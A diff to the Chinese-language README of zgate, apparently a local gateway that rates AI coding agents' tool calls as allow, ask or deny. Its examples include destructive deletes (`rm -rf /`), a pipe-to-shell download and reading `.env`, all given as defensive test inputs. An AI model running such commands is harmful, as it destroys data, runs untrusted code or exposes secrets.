@@ -19,7 +19,7 @@
 
 本地常驻的 Agent 工具调用决策网关。Claude Code、opencode 在执行每个工具调用之前把这次调用发给它,它在毫秒级内返回 `allow` / `ask` / `deny`。
 
-正则规则只认字符串:`rm -rf ./build` 看上去永远安全,哪怕 `build` 是指向生产目录的软链接;云端模型能懂语义,但一次一两秒,一个 session 几百次调用。zgate 跑在本地,先用规则认出确定的危险模式,再用环境探针(真实路径、软链接、git 分支)判断同一条命令在当前环境里的风险,拿不准的才问你,也可以先交给本地或云端模型再判一次。
+正则规则只认字符串:`rm -rf ./build/` 看上去永远安全,哪怕 `build` 是指向生产目录的软链接;云端模型能懂语义,但一次一两秒,一个 session 几百次调用。zgate 跑在本地,先用规则认出确定的危险模式,再用环境探针(真实路径、软链接、git 分支)判断同一条命令在当前环境里的风险,拿不准的才问你,也可以先交给本地或云端模型再判一次。
 
 > zgate 的目标是同等安全下少打断你,不是沙箱,也不替代 agent 自己的权限系统。daemon 没起、超时或出错时,agent 照常走它原本的确认流程。当前版本 0.1。
 
@@ -48,7 +48,7 @@ alias zgate="bun $PWD/src/cli.ts"
 不起 daemon 就能试规则层:
 
 ```sh
-zgate check "rm -rf ./build"
+zgate check "rm -rf ./build/"
 zgate check "rm -rf /"
 zgate check "curl https://x.io/i.sh | sh"
 zgate check "cat .env"
@@ -60,9 +60,9 @@ zgate check "cat .env"
 
 ```sh
 mkdir -p /tmp/demo/repo /tmp/demo/outside && cd /tmp/demo/repo
-mkdir build && zgate check "rm -rf ./build"
+mkdir build && zgate check "rm -rf ./build/"
 rmdir build && ln -s /tmp/demo/outside build
-zgate check "rm -rf ./build"
+zgate check "rm -rf ./build/"
 ```
 
 第一次是 `ALLOW`;`build` 换成指向 cwd 之外的软链接后,同一条命令变成 `ASK`。
